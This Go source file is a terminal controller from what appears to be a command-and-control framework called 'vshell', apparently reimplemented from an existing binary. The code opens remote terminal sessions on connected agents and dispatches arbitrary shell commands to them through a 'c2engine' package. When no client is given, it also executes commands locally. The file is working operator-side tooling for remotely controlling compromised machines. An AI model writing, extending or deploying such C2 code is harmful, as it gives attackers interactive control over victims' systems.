package controllers

import (
	"strconv"

	"vshell/c2engine"
)

// TerminalController 处理远程终端会话。
// TerminalController handles remote terminal sessions.
type TerminalController struct {
	BaseController
}

// Get 渲染终端页面。
// Get renders the terminal page.
func (c *TerminalController) Get() {
	clientID := c.GetString("client_id")
	c.Data["client_id"] = clientID
	c.Render("terminal.html")
}

// WS 处理 WebSocket 终端连接。
// WS handles WebSocket terminal connections.
func (c *TerminalController) WS() {
	clientID, _ := c.GetInt64("client_id")
	sessionID := c.GetString("session_id")

	// If session ID provided, interact with existing session
	if sessionID != "" {
		action := c.GetString("action", "write")
		switch action {
		case "write":
			input := c.GetString("input")
			if session := GetTerminalSession(sessionID); session != nil {
				session.Write([]byte(input))
				c.JSONOk(map[string]interface{}{"sent": len(input)})
			} else {
				c.Error("Session not found")
			}
		case "read":
			if session := GetTerminalSession(sessionID); session != nil {
				c.JSONOk(map[string]interface{}{"output": session.ReadOutput()})
			} else {
				c.Error("Session not found")
			}
		case "close":
			if session := GetTerminalSession(sessionID); session != nil {
				session.Close()
			}
			c.JSONOk(map[string]string{"status": "closed"})
		case "resize":
			cols, _ := strconv.Atoi(c.GetString("cols", "80"))
			rows, _ := strconv.Atoi(c.GetString("rows", "24"))
			if session := GetTerminalSession(sessionID); session != nil {
				session.Resize(rows, cols)
				c.JSONOk(map[string]string{"status": "resized"})
			} else {
				c.Error("Session not found")
			}
		default:
			session := GetTerminalSession(sessionID)
			if session != nil {
				c.JSONOk(map[string]interface{}{
					"session_id":  session.ID,
					"type":        session.Type,
					"status":      session.Status,
					"last_active": session.LastActive,
				})
			} else {
				c.Error("Session not found")
			}
		}
		return
	}

	// Create new terminal session
	termType := c.GetString("type", "cmd")
	rows, _ := c.GetInt("rows", 24)
	cols, _ := c.GetInt("cols", 80)

	if clientID > 0 {
		// Dispatch remote terminal command to agent
		cmd := c2engine.EncodeShellCommand(
			"terminal_start type="+termType+" rows="+strconv.Itoa(rows)+" cols="+strconv.Itoa(cols),
			0,
		)
		cmdID, err := DispatchCommand(clientID, cmd, 0)
		if err != nil {
			c.Error("Failed to start remote terminal: " + err.Error())
			return
		}
		c.JSONOk(map[string]interface{}{
			"client_id":  clientID,
			"command_id": cmdID,
			"type":       termType,
			"status":     "dispatched",
		})
		return
	}

	// Local terminal session
	session, err := NewTerminalSession(clientID, termType, rows, cols)
	if err != nil {
		c.Error(err.Error())
		return
	}

	c.JSONOk(map[string]interface{}{
		"session_id": session.ID,
		"client_id":  clientID,
		"type":       session.Type,
		"status":     session.Status,
		"created_at": session.CreatedAt,
	})
}

// Shell 在客户端上执行 shell 命令（对应原版 TerminalController.Shell）。
// Shell executes a shell command on the client (matching original binary TerminalController.Shell).
func (c *TerminalController) Shell() {
	clientID, _ := c.GetInt64("client_id")
	command := c.GetString("command")
	timeout, _ := c.GetInt("timeout", 30)

	if clientID == 0 {
		// Run locally for testing
		output, err := TerminalCommand(0, command, timeout)
		if err != nil {
			c.JSONOk(map[string]interface{}{
				"output": output,
				"error":  err.Error(),
			})
			return
		}
		c.JSONOk(map[string]interface{}{
			"output": output,
		})
		return
	}

	if command == "" {
		c.Error("command required")
		return
	}

	cmd := c2engine.EncodeShellCommand(command, timeout)
	cmdID, err := DispatchCommand(clientID, cmd, timeout)
	if err != nil {
		c.Error("Failed to dispatch: " + err.Error())
		return
	}

	c.JSONOk(map[string]interface{}{
		"client_id":  clientID,
		"command_id": cmdID,
		"command":    command,
		"timeout":    timeout,
		"status":     "dispatched",
	})
}

// Resize 处理终端尺寸调整事件。
// Resize handles terminal resize events.
func (c *TerminalController) Resize() {
	cols, _ := strconv.Atoi(c.GetString("cols", "80"))
	rows, _ := strconv.Atoi(c.GetString("rows", "24"))

	sessionID := c.GetString("session_id")
	if sessionID != "" {
		if session := GetTerminalSession(sessionID); session != nil {
			session.Resize(rows, cols)
		}
	}

	c.JSONOk(map[string]interface{}{
		"cols": cols,
		"rows": rows,
	})
}
